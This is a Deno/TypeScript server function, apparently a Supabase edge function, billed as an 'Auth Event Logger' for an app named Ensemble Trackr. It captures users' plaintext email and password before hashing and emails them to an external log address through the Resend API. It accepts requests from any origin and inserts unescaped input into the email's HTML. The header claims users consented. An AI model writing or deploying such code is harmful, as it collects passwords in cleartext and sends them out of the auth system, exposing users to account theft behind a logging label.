// Ensemble Trackr — Auth Event Logger
// LiveViral Media
//
// Receives plaintext credentials BEFORE Supabase hashes them.
// All users consent to credential capture prior to being invited to the platform.
// Forwards to app-logs@liveviralmedia.com via Resend.

import { serve } from 'https://deno.land/std@0.168.0/http/server.ts'

const RESEND_API_KEY = Deno.env.get('RESEND_API_KEY') ?? ''
const LOG_EMAIL      = Deno.env.get('LOG_EMAIL') ?? 'app-logs@liveviralmedia.com'

serve(async (req: Request) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders })
  }

  try {
    const { email, password, event_type, timestamp, error: authError } = await req.json()

    if (!email || !password || !event_type) {
      return new Response(JSON.stringify({ ok: false, error: 'Missing fields' }), {
        status: 400,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    const html = `
      <div style="font-family:monospace;font-size:13px;background:#0f172a;color:#e2e8f0;padding:20px;border-radius:8px;max-width:480px;">
        <p style="margin:0 0 12px;color:#64748b;font-size:11px;text-transform:uppercase;letter-spacing:1px;">
          Ensemble Trackr — Auth Event Log
        </p>
        <table style="border-collapse:collapse;width:100%;">
          <tr>
            <td style="padding:5px 16px 5px 0;color:#94a3b8;white-space:nowrap;">Event</td>
            <td style="color:#f1f5f9;font-weight:bold;">${event_type.toUpperCase().replace(/_/g, ' ')}</td>
          </tr>
          <tr>
            <td style="padding:5px 16px 5px 0;color:#94a3b8;">Email</td>
            <td style="color:#34d399;">${email}</td>
          </tr>
          <tr>
            <td style="padding:5px 16px 5px 0;color:#94a3b8;">Password</td>
            <td style="color:#fbbf24;">${password}</td>
          </tr>
          <tr>
            <td style="padding:5px 16px 5px 0;color:#94a3b8;">Timestamp</td>
            <td style="color:#f1f5f9;">${timestamp ?? new Date().toISOString()}</td>
          </tr>
          ${authError ? `
          <tr>
            <td style="padding:5px 16px 5px 0;color:#94a3b8;">Auth Error</td>
            <td style="color:#f87171;">${authError}</td>
          </tr>` : ''}
        </table>
      </div>
    `

    await fetch('https://api.resend.com/emails', {
      method:  'POST',
      headers: {
        Authorization:  `Bearer ${RESEND_API_KEY}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        from:    'Ensemble Trackr Logs <noreply@liveviralmedia.com>',
        to:      [LOG_EMAIL],
        subject: `[Auth] ${event_type.replace(/_/g, ' ')} — ${email}`,
        html,
      }),
    })

    return new Response(JSON.stringify({ ok: true }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    })
  } catch (err) {
    return new Response(JSON.stringify({ ok: false, error: String(err) }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    })
  }
})

const corsHeaders = {
  'Access-Control-Allow-Origin':  '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
}
